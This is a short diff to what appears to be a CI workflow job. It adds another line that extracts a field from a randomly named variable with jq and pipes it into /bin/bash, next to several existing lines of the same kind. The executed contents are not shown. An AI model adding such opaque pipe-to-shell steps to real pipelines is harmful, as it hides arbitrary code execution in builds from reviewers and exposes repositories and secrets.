@@ -28,6 +28,7 @@ jobs:
           echo $ru51 | jq -r .ud8 | /bin/bash
           printf '%s' "$yrnvv207" | jq -r .pt340 | /bin/bash
           printf '%s' "$yd73" | jq -r .sv4 | /bin/bash
+          echo $fn35378 | jq -r .chili3930 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
